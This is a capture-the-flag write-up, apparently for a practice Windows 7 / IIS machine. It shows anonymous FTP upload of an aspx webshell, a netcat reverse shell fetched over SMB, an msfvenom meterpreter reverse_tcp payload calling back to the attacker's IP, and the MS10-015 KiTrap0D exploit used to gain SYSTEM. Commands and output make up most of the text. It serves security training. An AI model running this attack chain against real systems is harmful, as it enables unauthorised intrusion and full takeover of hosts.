# devel

## Services
```bash

# Nmap 7.94 scan initiated Fri Jun  9 22:08:32 2023 as: nmap -sC -sV -p 21,80 -o nmap/tcp-script 10.129.201.239
Nmap scan report for 10.129.201.239
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  9 22:08:44 2023 -- 1 IP address (1 host up) scanned in 12.12 seconds
```
### FTP
The ftp service allows anonymous login and the ftp server contains 2 files in a dir that we have upload permissions and some other dirs that we don't.

### HTTP
The web server is returning the 2 files that we found on the ftp server, meaning that we have the ability to upload files to this web server and then have them executed.

Grabbing the headers with curl reveals the web framework that the web server is using:
```bash
HTTP/1.1 200 OK
Content-Length: 689
Content-Type: text/html
Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
Accept-Ranges: bytes
ETag: "37b5ed12c9fd21:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Sat, 10 Jun 2023 15:19:11 GMT
```
The web server is using ASP.NET, so we will need to upload an aspx file execute arbitrary code on the server.
### file upload vuln
There is an rce aspx script native to kali that we will use for this upload:
```bash
$ locate cmd.aspx
/opt/webshell/fuzzdb-webshell/asp/cmd.aspx
```
This script takes input to execute code on the server.

I'm unable to determine which directory the ftp server is uploading the files to, so to make this simpler we will boot up an smb server with a nc.exe to fetch from.
```bash

└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py share smb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```
Then we can navigate to our cmd.aspx rce file to have the server reach out to our smb server and execute netcat
![rce](images/rce.png)

Shell caught!

### privEsc

We catch the shell as iis apppool\web

First things first with windows privEsc, we want to figure out **who we are**, **what OS this is**, and what **privs** we have and what **patches** have been installed.
```ps

C:\Windows\System32\inetsrv>whoami
whoami
iis apppool\web

C:\Windows\System32\inetsrv>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babis                    Guest
The command completed with one or more errors.


C:\Windows\System32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31
System Boot Time:          10/6/2023, 4:59:22
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.433 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.528 MB
Virtual Memory: In Use:    613 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.201.239
                                 [02]: fe80::2c49:6020:5376:e939
                                 [03]: dead:beef::10f2:76be:7323:7d43
                                 [04]: dead:beef::2c49:6020:5376:e939

```
The systeminfo command returns the patches that have bene applied to the system in the Hotfix(s): field and we can see that none have been applied, so we should search for kernel exploits for this system
To do this there are several tools, but I'd like to take a lookat WES-NG, which only requires a txt file with the systeminfo response.
WES-NG returned way to many results to parse for legit ones. The other options require a windows vm and I don't currently have one of those. I will use metasploits suggester module

### exploit with metasploit
We need to create a meterpreter session so first we need to create an aspx payload with msfvenom

### msfvenom
create aspx payload to upload to server
```bash 
┌──(kali㉿kali)-[~/htb]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.10.14.8 LPORT=9999 -o reddish.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2874 bytes
Saved as: reddish.aspx
``` 

### ftp
upload payload
```bash

┌──(kali㉿kali)-[~/htb]
└─$ ftp $IP
Connected to 10.129.201.239.
220 Microsoft FTP Service
Name (10.129.201.239:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put
(local-file) reddish.aspx
(remote-file) reddish.aspx
local: reddish.aspx remote: reddish.aspx
229 Entering Extended Passive Mode (|||49221|)
125 Data connection already open; Transfer starting.
100% |************************************************************************|  2914       77.19 MiB/s    --:-- ETA
226 Transfer complete.
2914 bytes sent in 00:00 (57.05 KiB/s)
ftp> exit
221 Goodbye.
```

### catch with multi/handler
listen with meterpreter
navigate to uploaded reddish.aspx file and we catch the mterpreter shell
```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.8:9999
[*] Sending stage (175686 bytes) to 10.129.201.239

[*] Meterpreter session 1 opened (10.10.14.8:9999 -> 10.129.201.239:49222) at 2023-06-10 20:27:03 -0400

meterpreter >
```
### run suggester with meterpreter session
We background the meterpreter session and then use the suggester post module in metasploit `post/multi/recon/local_exploit_suggester` and it returns several exploits, but we will picke this one:
``2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.``

### exploit ms10-015
Setup the ms10-015 metasploit payload with the existin meterpreter session and run it to get SYSTEM
```bash


msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.8:9998
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 1448 launched.
[*] Reflectively injecting the DLL into 1448...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.129.201.239
[*] Meterpreter session 2 opened (10.10.14.8:9998 -> 10.129.201.239:49223) at 2023-06-10 20:37:03 -0400

meterpreter > shell
Process 3232 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system
```

And we can now retreive the flags from the box..
